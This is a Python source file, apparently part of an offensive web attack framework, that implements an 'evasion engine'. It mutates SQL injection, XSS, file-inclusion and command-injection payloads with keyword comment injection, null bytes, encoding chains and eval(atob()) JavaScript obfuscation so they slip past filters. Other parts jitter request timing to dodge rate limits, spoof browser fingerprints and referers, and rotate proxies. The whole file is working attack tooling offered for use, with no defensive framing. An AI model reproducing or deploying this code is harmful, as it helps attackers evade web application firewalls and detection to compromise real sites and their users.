#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v8.0 - ULTIMATE EDITION
Advanced Evasion Engine
"""

import re
import math
import time
import random
import string
import base64
import urllib.parse
import html

from config import Config, Colors, Payloads


class PayloadMutator:
    """Polymorphic payload transformation engine"""

    TECHNIQUES = [
        'encode_chain', 'case_alternate', 'comment_inject',
        'whitespace_random', 'null_byte', 'concat_split',
        'string_concat', 'js_obfuscate', 'html_entity', 'mixed_encode',
    ]

    SQL_KEYWORDS = re.compile(
        r'\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|FROM|WHERE|'
        r'AND|OR|ORDER|GROUP|HAVING|LIMIT|JOIN|INTO|VALUES|SET|'
        r'TABLE|DATABASE|SCHEMA|EXEC|EXECUTE|DECLARE|CAST|CONVERT|'
        r'CHAR|VARCHAR|NCHAR|ALTER|CREATE|TRUNCATE|SLEEP|BENCHMARK|'
        r'WAITFOR|DELAY|IF|CASE|WHEN|THEN|ELSE|END|LIKE|BETWEEN|'
        r'EXISTS|NOT|NULL|IS|IN|AS|ON|BY)\b',
        re.IGNORECASE,
    )

    WHITESPACE_ALTERNATIVES = [
        '\t', '\n', '\r', '\x0b', '\x0c', '/**/', '%09', '%0a',
        '%0d', '%0b', '%0c', '%a0', '+',
    ]

    def mutate(self, payload, technique='random'):
        if technique == 'random':
            technique = random.choice(self.TECHNIQUES)
        handler = getattr(self, f'_mutate_{technique}', None)
        if handler:
            return handler(payload)
        return payload

    def mutate_chain(self, payload, techniques=None):
        if techniques is None:
            count = random.randint(2, 4)
            techniques = random.sample(self.TECHNIQUES, min(count, len(self.TECHNIQUES)))
        result = payload
        for tech in techniques:
            result = self.mutate(result, tech)
        return result

    def _mutate_encode_chain(self, payload):
        stage1 = urllib.parse.quote(payload, safe='')
        stage2 = ''.join(f'%u{ord(c):04x}' if not c.startswith('%') else c
                         for c in self._split_encoded(stage1))
        stage3 = ''.join(f'\\x{ord(c):02x}' if random.random() < 0.3 else c
                         for c in stage2)
        return stage3

    def _mutate_case_alternate(self, payload):
        result = []
        alpha_idx = 0
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if alpha_idx % 2 == 0 else c.lower())
                alpha_idx += 1
            else:
                result.append(c)
        return ''.join(result)

    def _mutate_comment_inject(self, payload):
        def inject(match):
            word = match.group(0)
            if len(word) <= 2:
                return word
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + '/**/' + word[pos:]
        return self.SQL_KEYWORDS.sub(inject, payload)

    def _mutate_whitespace_random(self, payload):
        result = []
        for c in payload:
            if c == ' ':
                result.append(random.choice(self.WHITESPACE_ALTERNATIVES))
            else:
                result.append(c)
        return ''.join(result)

    def _mutate_null_byte(self, payload):
        injections = ['%00', '%0a', '%0d', '%09']
        result = []
        for c in payload:
            result.append(c)
            if random.random() < 0.05:
                result.append(random.choice(injections))
        return ''.join(result)

    def _mutate_concat_split(self, payload):
        result = []
        for c in payload:
            if c.isalpha():
                result.append(f'CHAR({ord(c)})')
            else:
                result.append(f"'{c}'")
        return '+'.join(result)

    def _mutate_string_concat(self, payload):
        parts = []
        chunk_size = random.randint(1, 3)
        i = 0
        while i < len(payload):
            end = min(i + chunk_size, len(payload))
            parts.append(f"'{payload[i:end]}'")
            i = end
            chunk_size = random.randint(1, 3)
        return '+'.join(parts)

    def _mutate_js_obfuscate(self, payload):
        techniques = [self._js_fromcharcode, self._js_atob, self._js_constructor]
        return random.choice(techniques)(payload)

    def _mutate_html_entity(self, payload):
        result = []
        for c in payload:
            r = random.random()
            if r < 0.4:
                result.append(f'&#{ord(c)};')
            elif r < 0.7:
                result.append(f'&#x{ord(c):x};')
            else:
                result.append(c)
        return ''.join(result)

    def _mutate_mixed_encode(self, payload):
        encoders = [
            lambda c: urllib.parse.quote(c, safe=''),
            lambda c: f'&#{ord(c)};',
            lambda c: f'%u{ord(c):04x}',
            lambda c: c,
        ]
        return ''.join(random.choice(encoders)(c) for c in payload)

    def _js_fromcharcode(self, payload):
        codes = ','.join(str(ord(c)) for c in payload)
        return f'String.fromCharCode({codes})'

    def _js_atob(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"

    def _js_constructor(self, payload):
        codes = ','.join(str(ord(c)) for c in payload)
        return f'[].constructor.constructor(String.fromCharCode({codes}))()'

    @staticmethod
    def _split_encoded(s):
        parts = []
        i = 0
        while i < len(s):
            if s[i] == '%' and i + 2 < len(s):
                parts.append(s[i:i+3])
                i += 3
            else:
                parts.append(s[i])
                i += 1
        return parts


class TimingEvasion:
    """Anti-detection timing controller"""

    def __init__(self, base_delay=0.5, jitter_range=0.3):
        self.base_delay = base_delay
        self.jitter_range = jitter_range
        self.request_count = 0
        self.burst_size = random.randint(3, 8)
        self.pause_duration = random.uniform(2.0, 5.0)
        self.backoff_factor = 1.0
        self.max_backoff = 60.0

    def get_delay(self):
        delay = max(0, random.gauss(self.base_delay * self.backoff_factor,
                                    self.jitter_range))
        self.request_count += 1

        if self.request_count % self.burst_size == 0:
            delay += self.pause_duration
            self.burst_size = random.randint(3, 8)
            self.pause_duration = random.uniform(2.0, 5.0)

        return delay

    def apply_jitter(self):
        jitter = random.uniform(-self.jitter_range, self.jitter_range)
        micro_pause = random.expovariate(10)
        delay = max(0, self.base_delay + jitter + micro_pause)
        time.sleep(delay)
        return delay

    def signal_rate_limit(self):
        self.backoff_factor = min(self.backoff_factor * 2.0, self.max_backoff)

    def signal_success(self):
        self.backoff_factor = max(1.0, self.backoff_factor * 0.75)

    def reset(self):
        self.backoff_factor = 1.0
        self.request_count = 0


class FingerprintRandomizer:
    """HTTP fingerprint spoofing engine"""

    # NOTE: TLS/JA3 fingerprint evasion requires cipher suite reordering at the
    # socket/ssl level, which is beyond what the requests library supports.
    # For full JA3 randomization, use a patched TLS library or curl_cffi.

    BROWSER_PROFILES = {
        'chrome_win': {
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"Windows"',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        },
        'chrome_mac': {
            'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"macOS"',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        },
        'chrome_linux': {
            'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"Linux"',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        },
        'chrome_android': {
            'ua': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec_ch_ua_mobile': '?1',
            'sec_ch_ua_platform': '"Android"',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        },
        'firefox_win': {
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'sec_ch_ua': None,
            'sec_ch_ua_mobile': None,
            'sec_ch_ua_platform': None,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        },
        'firefox_linux': {
            'ua': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'sec_ch_ua': None,
            'sec_ch_ua_mobile': None,
            'sec_ch_ua_platform': None,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        },
        'edge_win': {
            'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec_ch_ua_mobile': '?0',
            'sec_ch_ua_platform': '"Windows"',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        },
        'safari_mac': {
            'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'sec_ch_ua': None,
            'sec_ch_ua_mobile': None,
            'sec_ch_ua_platform': None,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
        'safari_ios': {
            'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'sec_ch_ua': None,
            'sec_ch_ua_mobile': None,
            'sec_ch_ua_platform': None,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
    }

    ACCEPT_LANGUAGES = [
        'en-US,en;q=0.9',
        'en-US,en;q=0.9,fr;q=0.8',
        'en-GB,en;q=0.9,en-US;q=0.8',
        'en-US,en;q=0.9,de;q=0.8,fr;q=0.7',
        'en-US,en;q=0.9,es;q=0.8',
        'en-US,en;q=0.9,ja;q=0.8',
        'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'en-US,en;q=0.5',
        'en-GB,en;q=0.5',
    ]

    ACCEPT_ENCODINGS = [
        'gzip, deflate, br',
        'gzip, deflate',
        'gzip, deflate, br, zstd',
        'br, gzip, deflate',
    ]

    REFERER_TEMPLATES = [
        'https://www.google.com/search?q={query}',
        'https://www.google.com/',
        'https://www.bing.com/search?q={query}',
        'https://duckduckgo.com/?q={query}',
        'https://search.yahoo.com/search?p={query}',
    ]

    SEARCH_TERMS = [
        'site+info', 'login+page', 'web+portal', 'dashboard',
        'admin+panel', 'home+page', 'online+service', 'support',
    ]

    def __init__(self):
        self._current_profile = None
        self._rotate()

    def _rotate(self):
        self._current_profile = random.choice(list(self.BROWSER_PROFILES.keys()))

    def get_headers(self, target_url=None):
        profile = self.BROWSER_PROFILES[self._current_profile]
        headers = {
            'User-Agent': profile['ua'],
            'Accept': profile['accept'],
            'Accept-Language': random.choice(self.ACCEPT_LANGUAGES),
            'Accept-Encoding': random.choice(self.ACCEPT_ENCODINGS),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
            'Sec-Fetch-User': '?1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
        }

        if random.random() < 0.6:
            headers['DNT'] = '1'

        if profile['sec_ch_ua']:
            headers['Sec-CH-UA'] = profile['sec_ch_ua']
            headers['Sec-CH-UA-Mobile'] = profile['sec_ch_ua_mobile']
            headers['Sec-CH-UA-Platform'] = profile['sec_ch_ua_platform']

        if random.random() < 0.7:
            headers['Referer'] = self._generate_referer(target_url)

        self._rotate()
        return headers

    def _generate_referer(self, target_url=None):
        if target_url and random.random() < 0.4:
            parsed = urllib.parse.urlparse(target_url)
            return f'{parsed.scheme}://{parsed.netloc}/'
        template = random.choice(self.REFERER_TEMPLATES)
        query = random.choice(self.SEARCH_TERMS)
        return template.format(query=query)


class EvasionEngine:
    """Main evasion orchestrator"""

    LEVEL_CONFIG = {
        'none': {
            'mutate': False,
            'timing': False,
            'fingerprint': False,
            'techniques': [],
            'mutation_rounds': 0,
        },
        'low': {
            'mutate': True,
            'timing': False,
            'fingerprint': True,
            'techniques': ['case_alternate', 'whitespace_random'],
            'mutation_rounds': 1,
        },
        'medium': {
            'mutate': True,
            'timing': True,
            'fingerprint': True,
            'techniques': ['case_alternate', 'whitespace_random',
                           'comment_inject', 'encode_chain'],
            'mutation_rounds': 1,
            'timing_base': 0.3,
            'timing_jitter': 0.2,
        },
        'high': {
            'mutate': True,
            'timing': True,
            'fingerprint': True,
            'techniques': ['case_alternate', 'whitespace_random',
                           'comment_inject', 'encode_chain',
                           'null_byte', 'html_entity'],
            'mutation_rounds': 2,
            'timing_base': 0.5,
            'timing_jitter': 0.3,
        },
        'insane': {
            'mutate': True,
            'timing': True,
            'fingerprint': True,
            'techniques': PayloadMutator.TECHNIQUES[:],
            'mutation_rounds': 3,
            'timing_base': 0.8,
            'timing_jitter': 0.5,
        },
        'stealth': {
            'mutate': True,
            'timing': True,
            'fingerprint': True,
            'techniques': ['case_alternate', 'comment_inject',
                           'whitespace_random', 'mixed_encode'],
            'mutation_rounds': 2,
            'timing_base': 2.0,
            'timing_jitter': 1.0,
        },
    }

    CONTEXT_TECHNIQUES = {
        'sql': ['case_alternate', 'comment_inject', 'whitespace_random',
                'concat_split', 'null_byte'],
        'xss': ['html_entity', 'js_obfuscate', 'mixed_encode',
                'encode_chain', 'string_concat'],
        'lfi': ['encode_chain', 'null_byte', 'mixed_encode'],
        'cmdi': ['whitespace_random', 'encode_chain', 'null_byte',
                 'string_concat'],
        'generic': None,
    }

    def __init__(self, level='none'):
        if level not in self.LEVEL_CONFIG:
            level = 'none'
        self.level = level
        self._config = self.LEVEL_CONFIG[level]

        self.mutator = PayloadMutator()
        self.fingerprint = FingerprintRandomizer()

        if self._config['timing']:
            self.timing = TimingEvasion(
                base_delay=self._config.get('timing_base', 0.5),
                jitter_range=self._config.get('timing_jitter', 0.3),
            )
        else:
            self.timing = None

    def evade(self, payload, context='generic'):
        if not self._config['mutate']:
            return payload

        available = self._config['techniques']
        context_preferred = self.CONTEXT_TECHNIQUES.get(context)
        if context_preferred:
            techniques = [t for t in context_preferred if t in available]
            if not techniques:
                techniques = available
        else:
            techniques = available

        if not techniques:
            return payload

        result = payload
        rounds = self._config['mutation_rounds']
        for _ in range(rounds):
            technique = random.choice(techniques)
            result = self.mutator.mutate(result, technique)
        return result

    def get_request_config(self, target_url=None):
        config = {
            'headers': {},
            'delay': 0,
            'proxy': None,
        }

        if self._config['fingerprint']:
            config['headers'] = self.fingerprint.get_headers(target_url)

        if self.timing:
            config['delay'] = self.timing.get_delay()

        if Config.PROXIES:
            config['proxy'] = random.choice(Config.PROXIES)

        return config
